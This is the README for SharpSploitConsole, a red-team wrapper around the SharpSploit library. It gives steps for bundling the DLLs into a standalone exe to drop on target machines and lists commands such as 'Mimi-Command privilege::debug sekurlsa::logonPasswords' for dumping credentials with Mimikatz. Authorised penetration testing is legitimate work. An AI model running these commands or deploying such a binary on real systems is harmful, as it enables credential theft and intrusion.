# SharpSploitConsole

Console Application designed to interact with SharpSploit released by @cobbr_io > https://github.com/cobbr/SharpSploit

SharpSploit is a tool written by @cobbr_io that combines many techniques/C# code from the infosec community and combines it into one sweet DLL.  It's awesome so check it out! 

Description
============
SharpSploit Console is just a quick proof of concept binary to help penetration testers or red teams with less C# experience play with some of the awesomeness that is SharpSploit.  By following the instructions below you should be able to embed both the SharpSploit.dll and System.Management.Automation.dll into the SharpSploitConsole binary, creating a standalone exe you can drop on an appropriate target sytem and run over a non-interactive shell (such as beacon).  

This concept can be applied to many C# binaries.  For example, we could embed the System.Management.Automation.dll into our favorite C# NoPowershell.exe, creating a binary that doesn't rely on the System.Management.Automation.dll on the target system.

Lastly, I am aware there are probably thousands of ways to make this better, faster, cooler, stealthier etc. So please free to let me know....in a nice way. :)  I also plan to add more modules and improve others.

**Before submitting issues, this tool may not always be updated actively. I encourage you to borrow, add, mod, and/or make your own.  Remember, all the awesome code out there (and there is a lot) can be taken/modified to create your own custom tools.**

Setup - Quick and Dirty
==============================

**Note: I used Windows 10, Visual Studio 2017 - mileage may vary**

1. Download SharpSploit tool from https://github.com/cobbr/SharpSploit.git

2. Open up SharpSploit.sln in Visual Studio and compile (make sure to compile for correct architecture) - Should see drop down with Any    CPU > Click on it and open Configuration Manager > under platform change to desired architecture and select ok.

3. Download SharpSploitConsole tool and open up SharpSploitConsole.sln

4. Copy both SharpSploit.dll and System.Management.Automation.dll found in SharpSploit/bin/x64/Debug directory into                        SharpSploitConsole/bin/x64/Debug folder

5. Next we will set up visual studio to embed our DLL's into our exe so we can just have a single binary we can run on our target          machine. We will do this by doing the following:

  In visual studio:

   a. Tools > NuGet Package Manager > Package Manager Console
 
   b. Inside console run:

      Install-Package Costura.Fody
  
   c. Open up notepad and paste the following code below and save it with the name FodyWeavers.xml inside the SharpSploitConsole               directory that holds your bin, obj, properties folders.

        <?xml version="1.0" encoding="utf-8"?>
        <Weavers>
          <Costura />
        </Weavers>

6. Inside visual studio, right click References on the righthand side, choose Add Reference, then browse to the                            SharpSploitConsole/bin/x64/Debug directory where we put our two DLL's, select them and add them.

7. Compile, drop binary on target computer and have fun.

Examples 
========

Note:  All commands are case insensitive

By default all commands can be taken in as command line args, they will be executed and the program will exit (great for remote shells).  This looks something like the following: sharpSploitConsole.exe getSystem logonPasswords.  Alternatively, if you want to use the interactive console mode, you can use the interact command to get a pseudo-interactive shell.

Start interactive console mode:

```Interact```

Mimikatz all the things (does not run DCSync) - requires admin or system:

```Mimi-All```

Runs a specific Mimikatz command of your choice - requires admin or system:

```Mimi-Command privilege::debug sekurlsa::logonPasswords```
